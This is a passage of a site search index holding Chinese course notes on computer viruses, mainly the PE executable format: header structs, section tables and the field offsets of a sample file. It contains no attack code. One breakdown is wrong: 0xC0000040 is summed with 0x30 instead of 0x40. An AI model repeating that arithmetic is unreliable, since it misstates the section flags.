\u6346\u7ed1\u673a"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u8ba1\u7b97\u673a\u75c5\u6bd2\u5bf9\u6297\u6280\u672f\u7684\u53d1\u5c55","text":"\u672a\u77e5\u75c5\u6bd2\u67e5\u6740\u6280\u672f \u9632\u75c5\u6bd2\u7acb\u4f53\u5316\u4f53\u7cfb \u6d41\u626b\u63cf\u6280\u672f \u4e91\u5b89\u5168","title":"\u8ba1\u7b97\u673a\u75c5\u6bd2\u5bf9\u6297\u6280\u672f\u7684\u53d1\u5c55"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/","text":"pe\u6587\u4ef6\u7ed3\u6784\u6982\u8ff0 # pe\u6587\u4ef6\u7ed3\u6784 # \u603b\u4f53\u7ed3\u6784 # MS DOS \u6587\u4ef6\u5934 # PE\u7b7e\u540d # \u8fd9\u4e00\u5b57\u6bb5\u5360 0x004 \u5b57\u8282\uff0c\u4e3a\u56fa\u5b9a\u5b50\u5b57\u4e32\u201dPE\\0\\0\u201d\uff0c\u5373 50 45 00 00 \uff0c\u6807\u5fd7\u7740PE\u6587\u4ef6\u5934\u7684\u5f00\u59cb \u6620\u50cf\u6587\u4ef6\u5934 # typedef struct _IMAGE_FILE_HEADER { WORD Machine; //\u6bcf\u4e2aCPU\u90fd\u62e5\u6709\u552f\u4e00\u7684machine\u7801 WORD NumberOfSections; //\u8282\u533a\u6570\u91cf\uff0c\u5f53\u5b9a\u4e49\u8282\u533a\u6570\u4e0e\u5b9e\u9645\u4e0d\u540c\u65f6\u4f1a\u53d1\u751f\u9519\u8bef DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; //\u53ef\u9009\u6620\u50cf\u5934\u7684\u5927\u5c0f\uff0c\u56fa\u5b9a\u7684 WORD Characteristics; //\u6587\u4ef6\u5c5e\u6027\uff0c0x0002h\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\uff0c0x2000h\u4e3aDLL\u6587\u4ef6 } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEAD - offset 0xB6-0xB7 \uff1a\u8be5\u5b57\u6bb5\u4e3aNumberOfSections\uff0c\u5b9a\u4e49\u4e86\u8282\u533a\u7684\u6570\u91cf\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x0003 \uff0c\u8bf4\u660e\u8be5\u7a0b\u5e8f\u542b\u6709\u4e09\u4e2a\u8282\u533a - offset 0xC4-0xC5 \uff1a\u8be5\u5b57\u6bb5\u4e3aSizeOfOptionalHeader\uff0c\u5b9a\u4e49\u4e86\u53ef\u9009\u6620\u50cf\u5934\uff08OptionalHeader\uff09\u7684\u5927\u5c0f\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x00E0 \u53ef\u9009\u6620\u50cf\u6587\u4ef6\u5934 # typedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; //\u6807\u5fd7\u5b57(32\u4f4d\u65f60x10Bh) BYTE MajorLinkerVersion; //\u8fde\u63a5\u5668\u4e3b\u7248\u672c\u53f7 BYTE MinorLinkerVersion; //\u8fde\u63a5\u5668\u6b21\u7248\u672c\u53f7 DWORD SizeOfCode; //\u4ee3\u7801\u6bb5\u5927\u5c0f DWORD SizeOfInitializedData; //\u5df2\u521d\u59cb\u5316\u6570\u636e\u5757\u5927\u5c0f DWORD SizeOfUninitializedData; //\u672a\u521d\u59cb\u5316\u6570\u636e\u5757\u5927\u5c0f DWORD AddressOfEntryPoint; //EP\u7684RVA\u503c\uff0c\u7a0b\u5e8f\u6700\u5148\u6267\u884c\u4ee3\u7801\u7684\u5730\u5740 DWORD BaseOfCode; //\u4ee3\u7801\u6bb5\u8d77\u59cbRVA DWORD BaseOfData; //\u6570\u636e\u6bb5\u8d77\u59cbRVA DWORD ImageBase; //PE\u6587\u4ef6\u7684\u88c5\u8f7d\u5730\u5740 DWORD SectionAlignment; //\u5757\u5bf9\u9f50\uff0c\u8282\u533a\u5728\u5185\u5b58\u4e2d\u6700\u5c0f\u5355\u4f4d DWORD FileAlignment; //\u6587\u4ef6\u5757\u5bf9\u9f50\uff0c\u8282\u533a\u5728\u6587\u4ef6\u4e2d\u7684\u6700\u5c0f\u5355\u4f4d WORD MajorOperatingSystemVersion;//\u6240\u9700\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u53f7 WORD MinorOperatingSystemVersion;// WORD MajorImageVersion; //\u7528\u6237\u81ea\u5b9a\u4e49\u4e3b\u7248\u672c\u53f7 WORD MinorImageVersion; //\u7528\u6237\u81ea\u5b9a\u4e49\u6b21\u7248\u672c\u53f7 WORD MajorSubsystemVersion; //win32\u5b50\u7cfb\u7edf\u7248\u672c\u3002\u82e5PE\u6587\u4ef6\u662f\u4e13\u95e8\u4e3aWin32\u8bbe\u8ba1\u7684 WORD MinorSubsystemVersion; //\u8be5\u5b50\u7cfb\u7edf\u7248\u672c\u5fc5\u5b9a\u662f4.0\u5426\u5219\u5bf9\u8bdd\u6846\u4e0d\u4f1a\u67093\u7ef4\u7acb\u4f53\u611f DWORD Win32VersionValue; //\u4fdd\u7559 DWORD SizeOfImage; //\u5185\u5b58\u4e2d\u6574\u4e2aPE\u6620\u50cf\u4f53\u7684\u5c3a\u5bf8 DWORD SizeOfHeaders; //\u6240\u6709\u5934+\u8282\u8868\u7684\u5927\u5c0f\uff0c\u5373\u6574\u4e2aPE\u5934\u7684\u5927\u5c0f DWORD CheckSum; //\u6821\u9a8c\u548c WORD Subsystem; //NT\u7528\u6765\u8bc6\u522bPE\u6587\u4ef6\u5c5e\u4e8e\u54ea\u4e2a\u5b50\u7cfb\u7edf\uff08\u7cfb\u7edf\u9a71\u52a8\u3001GUI\u3001CUI\uff09 WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; //\u6307\u5b9aDataDirectory\u6570\u7ec4\u7684\u4e2a\u6570 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];//IMAGE_DATA_DIRECTORY \u7ed3\u6784\u6570\u7ec4\u3002\u6bcf\u4e2a\u7ed3\u6784\u7ed9\u51fa\u4e00\u4e2a\u91cd\u8981\u6570\u636e\u7ed3\u6784\u7684RVA\uff0c\u6bd4\u5982\u5f15\u5165\u5730\u5740\u8868\u7b49 } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; - offset 0xD8-0xDB \uff1a\u8be5\u5b57\u6bb5\u4e3aAddressOfEntryPoint\uff0c\u5b9a\u4e49\u4e86\u6587\u4ef6\u5f00\u59cb\u6267\u884c\u4f4d\u7f6e\u7684\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x00001000 - offset 0xE4-0xE7 \uff1a\u8be5\u5b57\u6bb5\u4e3aImageBase\uff0c\u5b9a\u4e49\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u9ed8\u8ba4\u88c5\u5165\u7684\u5185\u5b58\u5730\u5740\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x00400000 - offset 0x124-0x127 \uff1a\u8be5\u5b57\u6bb5\u4e3aNumberOfRvaAndSizes\uff0c\u6307\u793a\u4e86\u6570\u636e\u76ee\u5f55\u9879\uff08DataDirectory\uff09\u7684\u9879\u6570\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000010 \uff0c\u537316\u9879 - offset 0x128-0x1A7 \uff1a\u8be5\u5b57\u6bb5\u4e3aDataDirectory\uff0c\u662f\u4e00\u4e2aIMAGE_DATA_DIRECTORY\u6570\u7ec4\uff0c\u91cc\u9762\u5b58\u653e\u7684\u662f\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4e00\u4e9b\u91cd\u8981\u90e8\u5206\u7684\u8d77\u59cbRVA\u548c\u5c3a\u5bf8\uff0c\u76ee\u7684\u662f\u4f7f\u53ef\u6267\u884c\u6587\u4ef6\u66f4\u5feb\u5730\u8fdb\u884c\u88c5\u8f7d DataDirectory # \u7b2c0\u4e2a\u5143\u7d20\u662f \u5bfc\u51fa\u8868\u7684\u5730\u5740\u548c\u5927\u5c0f\uff0c\u7b2c1\u4e2a\u5143\u7d20\u662f\u5bfc\u2f0a\u8868\u7684\u5730\u5740\u548c\u5927\u5c0f \u6bcf\u4e2a\u5143\u7d20\u7684\u524d4\u4e2a\u5b57\u8282\u662f\u5730\u5740RVA\uff0c\u540e4\u4e2a\u5b57\u8282\u662f\u8868\u7684\u5927\u5c0f \u8282\u8868 # \u7d27\u63a5\u7740PE\u6587\u4ef6\u5934\u7684\u662f\u8282\u8868\u3002\u8282\u8868\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u7ed3\u6784\u5305\u542b\u4e86\u4e00\u4e2a\u8282\u7684\u5177\u4f53\u4fe1\u606f\uff08\u6bcf\u4e2a\u7ed3\u6784\u5360\u7528 0x28 \u5b57\u8282\uff09\uff0c\u8be5\u7ed3\u6784\u7684\u5185\u5bb9\u5982\u4e0b\uff1a #define IMAGE_SIZEOF_SHORT_NAME 8 typedef struct _IMAGE_SECTION_HEADER{ BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8\u4e2a\u5b57\u8282\u7684\u8282\u533a\u540d\u79f0 union { DWORD PhysicalAddress; DWORD VirtualSize; //\u5185\u5b58\u4e2d\u8282\u533a\u7684\u5927\u5c0f } Misc; DWORD VirtualAddress; // \u5185\u5b58\u4e2d\u8282\u533a\u7684\u8d77\u59cb\u5730\u5740\uff08RVA\uff09 DWORD SizeOfRawData; // \u78c1\u76d8\u4e2d\u6587\u4ef6\u4e2d\u8282\u533a\u6240\u5360\u5927\u5c0f DWORD PointerToRawData; // \u78c1\u76d8\u4e2d\u6587\u4ef6\u7684\u8d77\u59cb\u4f4d\u7f6e DWORD PointerToRelocations; // \u5728OBJ\u6587\u4ef6\u4e2d\u4f7f\u7528\uff0c\u91cd\u5b9a\u4f4d\u7684\u504f\u79fb DWORD PointerToLinenumbers; // \u884c\u53f7\u8868\u7684\u504f\u79fb\uff08\u4f9b\u8c03\u8bd5\u4f7f\u7528\u5730\uff09 WORD NumberOfRelocations; // \u5728OBJ\u6587\u4ef6\u4e2d\u4f7f\u7528\uff0c\u91cd\u5b9a\u4f4d\u9879\u6570\u76ee WORD NumberOfLinenumbers; // \u884c\u53f7\u8868\u4e2d\u884c\u53f7\u7684\u6570\u76ee DWORD Characteristics; // \u8282\u5c5e\u6027\u5982\u53ef\u8bfb\uff0c\u53ef\u5199\uff0c\u53ef\u6267\u884c\u7b49 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; .text\u8282\u8868 # \u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u5b57\u6bb5\uff1a offset 0x1A8-0x1AF \uff1a\u8be5\u5b57\u6bb5\u4e3aName\uff0c\u53ef\u4ee5\u4eceASCII\u7801\u503c\u770b\u51fa\u8be5\u8282\u8868\u5bf9\u5e94\u7684\u8282\u4e3a.text\u8282 offset 0x1B0-0x1B3 \uff1a\u8be5\u5b57\u6bb5\u5728exe\u6587\u4ef6\u4e2d\u4e3aVirtual-Size\uff0c\u8868\u793a\u8282\u7684\u5b9e\u9645\u5b57\u8282\u6570\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000046 \u5b57\u8282 offset 0x1B4-0x1B7 \uff1a\u8be5\u5b57\u6bb5\u4e3aVirtualAddress\uff0c\u8868\u793a\u672c\u8282\u8d77\u59cb\u7684\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00001000 offset 0x1BC-0x1BF \uff1a\u8be5\u5b57\u6bb5\u4e3aPointerToRawData\uff0c\u8868\u793a\u672c\u8282\u5728\u78c1\u76d8\u4e2d\u5bf9\u9f50\u540e\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000400 offset 0x1CC-0x1CF \uff1a\u8be5\u5b57\u6bb5\u4e3aCharacteristic\uff0c\u8868\u793a\u8be5\u8282\u7684\u5c5e\u6027\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x60000020 = 0x40000000 + 0x20000000 + 0x20 \uff0c\u8868\u793a\u7684\u610f\u4e49\u662f\u8be5\u8282\u5305\u542b\u4ee3\u7801\uff0c\u5e76\u4e14\u53ef\u8bfb\u53ef\u6267\u884c .rdata\u8282\u8868 # \u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u5b57\u6bb5\uff1a offset 0x1D0-0x1D7 \uff1a\u8be5\u5b57\u6bb5\u4e3aName\uff0c\u53ef\u4ee5\u4eceASCII\u7801\u503c\u770b\u51fa\u8be5\u8282\u8868\u5bf9\u5e94\u7684\u8282\u4e3a.rdata\u8282 offset 0x1D8-0x1DB \uff1a\u8be5\u5b57\u6bb5\u5728exe\u6587\u4ef6\u4e2d\u4e3aVirtual-Size\uff0c\u8868\u793a\u8282\u7684\u5b9e\u9645\u5b57\u8282\u6570\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x000000A6 \u5b57\u8282 offset 0x1DC-0x1DF \uff1a\u8be5\u5b57\u6bb5\u4e3aVirtualAddress\uff0c\u8868\u793a\u672c\u8282\u8d77\u59cb\u7684\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00002000 offset 0x1E4-0x1E7 \uff1a\u8be5\u5b57\u6bb5\u4e3aPointerToRawData\uff0c\u8868\u793a\u672c\u8282\u5728\u78c1\u76d8\u4e2d\u5bf9\u9f50\u540e\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000600 offset 0x1F0-0x1F7 \uff1a\u8be5\u5b57\u6bb5\u4e3aCharacteristic\uff0c\u8868\u793a\u8be5\u8282\u7684\u5c5e\u6027\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x40000040 = 0x40000000 + 0x40 \uff0c\u8868\u793a\u7684\u610f\u4e49\u662f\u8be5\u8282\u5305\u542b\u5df2\u521d\u59cb\u5316\u7684\u6570\u636e\uff0c\u5e76\u4e14\u53ef\u8bfb .data\u8282\u8868 # offset 0x1F8-0x1FF \uff1a\u8be5\u5b57\u6bb5\u4e3aName\uff0c\u53ef\u4ee5\u4eceASCII\u7801\u503c\u770b\u51fa\u8be5\u8282\u8868\u5bf9\u5e94\u7684\u8282\u4e3a.data\u8282 offset 0x200-0x203 \uff1a\u8be5\u5b57\u6bb5\u5728exe\u6587\u4ef6\u4e2d\u4e3aVirtual-Size\uff0c\u8868\u793a\u8282\u7684\u5b9e\u9645\u5b57\u8282\u6570\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x0000008E \u5b57\u8282 offset 0x204-0x207 \uff1a\u8be5\u5b57\u6bb5\u4e3aVirtualAddress\uff0c\u8868\u793a\u672c\u8282\u8d77\u59cb\u7684\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00003000 offset 0x20C-0x20F \uff1a\u8be5\u5b57\u6bb5\u4e3aPointerToRawData\uff0c\u8868\u793a\u672c\u8282\u5728\u78c1\u76d8\u4e2d\u5bf9\u9f50\u540e\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000800 offset 0x21C-0x21F \uff1a\u8be5\u5b57\u6bb5\u4e3aCharacteristic\uff0c\u8868\u793a\u8be5\u8282\u7684\u5c5e\u6027\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0xC0000040 = 0x80000000 + 0x40000000 + 0x30 \uff0c\u8868\u793a\u7684\u610f\u4e49\u662f\u8be5\u8282\u5305\u542b\u5df2\u521d\u59cb\u5316\u7684\u6570\u636e\uff0c\u5e76\u4e14\u53ef\u8bfb\u53ef\u5199 .text\u8282 # \u8fd9\u4e00\u8282\u542b\u6709\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u6839\u636e\u8282\u8868\u4e2d\u7684\u503c\uff0c\u53ef\u4ee5\u786e\u5b9a.text\u8282\u5728\u6587\u4ef6\u4e2d\u7684\u5730\u5740\u4e3a 0x00000400 \uff0c\u5b9e\u9645\u957f\u5ea6\u4e3a 0x46 \u5b57\u8282\uff0c\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff1a .rdata\u8282 # \u8fd9\u4e00\u8282\u79f0\u4e3a\u5f15\u5165\u51fd\u6570\u8282\uff0c\u5305\u542b\u6709\u4ece\u5176\u4ed6DLL\u4e2d\u5f15\u5165\u7684\u51fd\u6570\uff0c\u6839\u636eIMAGE_DATA_DIRECTORY\u4e2d\u5f15\u5165\u51fd\u6570\u8868\u5730\u5740\u4e3a 0x00002014 \uff0c\u4e14\u6839\u636e\u8282\u8868\uff0c\u8be5\u8868\u5728\u5185\u5b58\u4e2d\u7684\u504f\u79fb\u4e3a 0x00002000 \uff0c\u5373RVA\u4e3a 0x0 \u3002\u6839\u636e\u8282\u8868\uff0c\u8be5\u8282\u4ece\u6587\u4ef6\u504f\u79fb 0x600 \u5904\u5f00\u59cb\uff0c\u90a3\u4e48.rdata\u8868\u5728\u6587\u4ef6\u4e2d\u7684\u504f\u79fb\u5c31\u4e3a 0x614 \u3002\u5927\u5c0f\u4e3a 0xA6 \u5b57\u8282\u3002 .data\u8282 # .data\u8282\u79f0\u4e3a\u5df2\u521d\u59cb\u5316\u7684\u6570\u636e\u8282\uff0c\u5176\u4e2d\u5b58\u653e\u7684\u662f\u5728\u7f16\u8bd1\u65f6\u523b\u5df2\u7ecf\u786e\u5b9a\u7684\u6570\u636e\u3002\u53ef\u4ee5\u4ece\u8282\u8868\u4e2d\u77e5\u9053\uff0c\u8be5\u8282\u4ece\u6587\u4ef6\u504f\u79fb 0x800 \u5904\u5f00\u59cb\uff0c\u5b9e\u9645\u5927\u5c0f\u4e3a 0x8E \u5b57\u8282\u3002","title":"pe\u6587\u4ef6\u7ed3\u6784\u6982\u8ff0"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#pe\u6587\u4ef6\u7ed3\u6784\u6982\u8ff0","text":"","title":"pe\u6587\u4ef6\u7ed3\u6784\u6982\u8ff0"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#pe\u6587\u4ef6\u7ed3\u6784","text":"","title":"pe\u6587\u4ef6\u7ed3\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#\u603b\u4f53\u7ed3\u6784","text":"","title":"\u603b\u4f53\u7ed3\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#ms-dos-\u6587\u4ef6\u5934","text":"","title":"MS DOS \u6587\u4ef6\u5934"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#pe\u7b7e\u540d","text":"\u8fd9\u4e00\u5b57\u6bb5\u5360 0x004 \u5b57\u8282\uff0c\u4e3a\u56fa\u5b9a\u5b50\u5b57\u4e32\u201dPE\\0\\0\u201d\uff0c\u5373 50 45 00 00 \uff0c\u6807\u5fd7\u7740PE\u6587\u4ef6\u5934\u7684\u5f00\u59cb","title":"PE\u7b7e\u540d"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#\u6620\u50cf\u6587\u4ef6\u5934","text":"typedef struct _IMAGE_FILE_HEADER { WORD Machine; //\u6bcf\u4e2aCPU\u90fd\u62e5\u6709\u552f\u4e00\u7684machine\u7801 WORD NumberOfSections; //\u8282\u533a\u6570\u91cf\uff0c\u5f53\u5b9a\u4e49\u8282\u533a\u6570\u4e0e\u5b9e\u9645\u4e0d\u540c\u65f6\u4f1a\u53d1\u751f\u9519\u8bef DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; //\u53ef\u9009\u6620\u50cf\u5934\u7684\u5927\u5c0f\uff0c\u56fa\u5b9a\u7684 WORD Characteristics; //\u6587\u4ef6\u5c5e\u6027\uff0c0x0002h\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\uff0c0x2000h\u4e3aDLL\u6587\u4ef6 } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEAD - offset 0xB6-0xB7 \uff1a\u8be5\u5b57\u6bb5\u4e3aNumberOfSections\uff0c\u5b9a\u4e49\u4e86\u8282\u533a\u7684\u6570\u91cf\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x0003 \uff0c\u8bf4\u660e\u8be5\u7a0b\u5e8f\u542b\u6709\u4e09\u4e2a\u8282\u533a - offset 0xC4-0xC5 \uff1a\u8be5\u5b57\u6bb5\u4e3aSizeOfOptionalHeader\uff0c\u5b9a\u4e49\u4e86\u53ef\u9009\u6620\u50cf\u5934\uff08OptionalHeader\uff09\u7684\u5927\u5c0f\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x00E0","title":"\u6620\u50cf\u6587\u4ef6\u5934"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#\u53ef\u9009\u6620\u50cf\u6587\u4ef6\u5934","text":"typedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; //\u6807\u5fd7\u5b57(32\u4f4d\u65f60x10Bh) BYTE MajorLinkerVersion; //\u8fde\u63a5\u5668\u4e3b\u7248\u672c\u53f7 BYTE MinorLinkerVersion; //\u8fde\u63a5\u5668\u6b21\u7248\u672c\u53f7 DWORD SizeOfCode; //\u4ee3\u7801\u6bb5\u5927\u5c0f DWORD SizeOfInitializedData; //\u5df2\u521d\u59cb\u5316\u6570\u636e\u5757\u5927\u5c0f DWORD SizeOfUninitializedData; //\u672a\u521d\u59cb\u5316\u6570\u636e\u5757\u5927\u5c0f DWORD AddressOfEntryPoint; //EP\u7684RVA\u503c\uff0c\u7a0b\u5e8f\u6700\u5148\u6267\u884c\u4ee3\u7801\u7684\u5730\u5740 DWORD BaseOfCode; //\u4ee3\u7801\u6bb5\u8d77\u59cbRVA DWORD BaseOfData; //\u6570\u636e\u6bb5\u8d77\u59cbRVA DWORD ImageBase; //PE\u6587\u4ef6\u7684\u88c5\u8f7d\u5730\u5740 DWORD SectionAlignment; //\u5757\u5bf9\u9f50\uff0c\u8282\u533a\u5728\u5185\u5b58\u4e2d\u6700\u5c0f\u5355\u4f4d DWORD FileAlignment; //\u6587\u4ef6\u5757\u5bf9\u9f50\uff0c\u8282\u533a\u5728\u6587\u4ef6\u4e2d\u7684\u6700\u5c0f\u5355\u4f4d WORD MajorOperatingSystemVersion;//\u6240\u9700\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u53f7 WORD MinorOperatingSystemVersion;// WORD MajorImageVersion; //\u7528\u6237\u81ea\u5b9a\u4e49\u4e3b\u7248\u672c\u53f7 WORD MinorImageVersion; //\u7528\u6237\u81ea\u5b9a\u4e49\u6b21\u7248\u672c\u53f7 WORD MajorSubsystemVersion; //win32\u5b50\u7cfb\u7edf\u7248\u672c\u3002\u82e5PE\u6587\u4ef6\u662f\u4e13\u95e8\u4e3aWin32\u8bbe\u8ba1\u7684 WORD MinorSubsystemVersion; //\u8be5\u5b50\u7cfb\u7edf\u7248\u672c\u5fc5\u5b9a\u662f4.0\u5426\u5219\u5bf9\u8bdd\u6846\u4e0d\u4f1a\u67093\u7ef4\u7acb\u4f53\u611f DWORD Win32VersionValue; //\u4fdd\u7559 DWORD SizeOfImage; //\u5185\u5b58\u4e2d\u6574\u4e2aPE\u6620\u50cf\u4f53\u7684\u5c3a\u5bf8 DWORD SizeOfHeaders; //\u6240\u6709\u5934+\u8282\u8868\u7684\u5927\u5c0f\uff0c\u5373\u6574\u4e2aPE\u5934\u7684\u5927\u5c0f DWORD CheckSum; //\u6821\u9a8c\u548c WORD Subsystem; //NT\u7528\u6765\u8bc6\u522bPE\u6587\u4ef6\u5c5e\u4e8e\u54ea\u4e2a\u5b50\u7cfb\u7edf\uff08\u7cfb\u7edf\u9a71\u52a8\u3001GUI\u3001CUI\uff09 WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; //\u6307\u5b9aDataDirectory\u6570\u7ec4\u7684\u4e2a\u6570 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];//IMAGE_DATA_DIRECTORY \u7ed3\u6784\u6570\u7ec4\u3002\u6bcf\u4e2a\u7ed3\u6784\u7ed9\u51fa\u4e00\u4e2a\u91cd\u8981\u6570\u636e\u7ed3\u6784\u7684RVA\uff0c\u6bd4\u5982\u5f15\u5165\u5730\u5740\u8868\u7b49 } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; - offset 0xD8-0xDB \uff1a\u8be5\u5b57\u6bb5\u4e3aAddressOfEntryPoint\uff0c\u5b9a\u4e49\u4e86\u6587\u4ef6\u5f00\u59cb\u6267\u884c\u4f4d\u7f6e\u7684\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x00001000 - offset 0xE4-0xE7 \uff1a\u8be5\u5b57\u6bb5\u4e3aImageBase\uff0c\u5b9a\u4e49\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u9ed8\u8ba4\u88c5\u5165\u7684\u5185\u5b58\u5730\u5740\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x00400000 - offset 0x124-0x127 \uff1a\u8be5\u5b57\u6bb5\u4e3aNumberOfRvaAndSizes\uff0c\u6307\u793a\u4e86\u6570\u636e\u76ee\u5f55\u9879\uff08DataDirectory\uff09\u7684\u9879\u6570\uff0c\u5728\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000010 \uff0c\u537316\u9879 - offset 0x128-0x1A7 \uff1a\u8be5\u5b57\u6bb5\u4e3aDataDirectory\uff0c\u662f\u4e00\u4e2aIMAGE_DATA_DIRECTORY\u6570\u7ec4\uff0c\u91cc\u9762\u5b58\u653e\u7684\u662f\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4e00\u4e9b\u91cd\u8981\u90e8\u5206\u7684\u8d77\u59cbRVA\u548c\u5c3a\u5bf8\uff0c\u76ee\u7684\u662f\u4f7f\u53ef\u6267\u884c\u6587\u4ef6\u66f4\u5feb\u5730\u8fdb\u884c\u88c5\u8f7d","title":"\u53ef\u9009\u6620\u50cf\u6587\u4ef6\u5934"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#datadirectory","text":"\u7b2c0\u4e2a\u5143\u7d20\u662f \u5bfc\u51fa\u8868\u7684\u5730\u5740\u548c\u5927\u5c0f\uff0c\u7b2c1\u4e2a\u5143\u7d20\u662f\u5bfc\u2f0a\u8868\u7684\u5730\u5740\u548c\u5927\u5c0f 